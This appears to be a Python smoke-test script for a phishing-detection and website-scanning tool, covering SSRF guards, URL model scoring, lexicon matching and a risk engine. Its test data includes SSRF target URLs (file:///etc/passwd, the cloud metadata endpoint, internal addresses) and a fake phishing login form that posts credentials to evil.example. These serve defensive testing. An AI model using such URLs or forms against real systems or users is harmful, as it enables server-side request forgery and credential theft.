"""Smoke test for the new website-modality building blocks (no services needed).

Run:  .venv/Scripts/python.exe -m tests.test_website_core
Verifies imports, SSRF guards, URL-model inference, HTML/text feature extraction,
and the risk engine - all against a REAL trained model and a REAL fetch.
"""
from __future__ import annotations

import sys

PASS, FAIL = 0, 0


def check(name, cond, extra=""):
    global PASS, FAIL
    if cond:
        PASS += 1
        print(f"  PASS  {name} {extra}")
    else:
        FAIL += 1
        print(f"  FAIL  {name} {extra}")


def main() -> int:
    print("== imports ==")
    from app.acquisition import url_safety, fetcher, renderer
    from app.features import html_features, page_text
    from app.models import url_model
    from app.risk import engine
    from app.ml import social_lexicon
    check("all new modules import", True)

    print("== SSRF guards ==")
    for bad, why in [
        ("file:///etc/passwd", "file scheme"),
        ("ftp://example.com", "ftp scheme"),
        ("http://127.0.0.1:8088/api/health", "loopback"),
        ("http://169.254.169.254/latest/meta-data/", "cloud metadata"),
        ("http://192.168.1.1/", "private"),
        ("http://10.0.0.5/", "private 10/8"),
        ("http://[::1]/", "loopback v6"),
        ("http://google.com@evil.example/", "creds in url"),
        ("http://example.com:6379/", "redis port"),
        ("javascript:alert(1)", "js scheme"),
    ]:
        v = url_safety.validate_url_for_fetch(bad)
        check(f"block {why}", not v.safe, f"[{v.reason}]")

    good = url_safety.validate_url_for_fetch("https://www.example.com/")
    check("allow public https", good.safe, f"[{good.host}]")

    print("== URL model inference (REAL artifacts) ==")
    avail = url_model.available_models()
    check("url models load", len(avail) >= 1, f"available={avail}")
    phish = url_model.predict("http://paypal-secure-login.verify-account.xyz/index.html?user=1")
    legit = url_model.predict("https://www.wikipedia.org/wiki/Phishing")
    check("phishing-like URL scores high",
          phish.ok and phish.probability is not None and phish.probability > 0.5,
          f"P={phish.probability}")
    check("legit-like URL scores low",
          legit.ok and legit.probability is not None and legit.probability < 0.5,
          f"P={legit.probability}")
    check("SHAP/top contributors present", len(phish.contributors) > 0,
          f"n={len(phish.contributors)}")

    print("== social lexicon ==")
    hits = social_lexicon.find_phrases(
        "Urgent! Your account has been suspended. Verify your password within 24 hours.")
    cats = {m.category for m in hits}
    check("lexicon fires on phishing text",
          "credential_request" in cats and "account_threat" in cats, f"cats={sorted(cats)}")

    print("== text analysis ==")
    ta = page_text.analyze_text("Dear customer, verify your account now to avoid suspension.")
    check("text analysis produces findings", ta.ok and len(ta.findings) > 0,
          f"n={len(ta.findings)}")

    print("== HTML analysis (synthetic phishing DOM) ==")
    ph_html = """
    <html><head><title>PayPal Login</title></head><body>
    <form action="http://evil.example/steal" method="post">
      <input type="text" name="user"><input type="password" name="pw">
      <input type="hidden" name="t" value="1">
    </form></body></html>"""
    ha = html_features.analyze_html(ph_html, "https://paypal.com/login")
    types = {f.evidence_type for f in ha.findings}
    check("flags external password form",
          "password_form_external_action" in types, f"types={sorted(types)}")
    check("flags brand+external form (CRITICAL)",
          "brand_claim_with_external_form" in types)

    print("== risk engine (fusion + missing modalities) ==")
    from app.findings import Finding
    m_url = engine.ModalityOutcome("URL", engine.STATUS_OK, 0.92, model_name="url_xgboost")
    m_html = engine.ModalityOutcome("HTML", engine.STATUS_OK, 0.88, model_name="rules")
    m_vision = engine.ModalityOutcome("VISION", engine.STATUS_MODEL_MISSING,
                                      None, note="no model")
    r = engine.assess_risk("WEBSITE", [m_url, m_html, m_vision], findings=[
        Finding("HTML", "password_form_external_action", "ext form", "HIGH")])
    check("high multimodal risk -> PHISHING",
          r.classification == engine.CLASS_PHISHING, f"{r.classification}/{r.risk_level} s={r.risk_score}")
    check("missing modality tracked", "VISION" in r.missing_modalities)
    check("partial scan flagged", r.scan_status == "PARTIAL")

    # All modalities missing -> UNKNOWN, not 'safe'
    r2 = engine.assess_risk("WEBSITE", [
        engine.ModalityOutcome("URL", engine.STATUS_FAILED, None)])
    check("all-failed -> UNKNOWN not safe",
          r2.classification == engine.CLASS_UNKNOWN and r2.risk_score is None)
    check("failed scan status", r2.scan_status == "FAILED")

    # Critical finding floor: low model score + CRITICAL finding -> >= SUSPICIOUS/HIGH
    r3 = engine.assess_risk("WEBSITE", [
        engine.ModalityOutcome("URL", engine.STATUS_OK, 0.10),
        engine.ModalityOutcome("HTML", engine.STATUS_OK, 0.15)], findings=[
        Finding("HTML", "brand_claim_with_external_form", "crit", "CRITICAL")])
    check("critical-finding floor raises verdict",
          r3.evidence_floor_applied and r3.classification == engine.CLASS_SUSPICIOUS
          and r3.risk_level == engine.LEVEL_HIGH,
          f"{r3.classification}/{r3.risk_level}")

    print("== REAL fetch (network) ==")
    fr = fetcher.fetch_html("https://example.com")
    check("fetch public site", fr.ok and len(fr.html) > 100,
          f"status={fr.status_code} bytes={fr.bytes_read}")
    blocked = fetcher.fetch_html("http://169.254.169.254/")
    check("fetcher refuses metadata IP", not blocked.ok, f"[{blocked.reason}]")

    print(f"\nRESULT: {PASS} passed, {FAIL} failed")
    return 1 if FAIL else 0


if __name__ == "__main__":
    sys.exit(main())
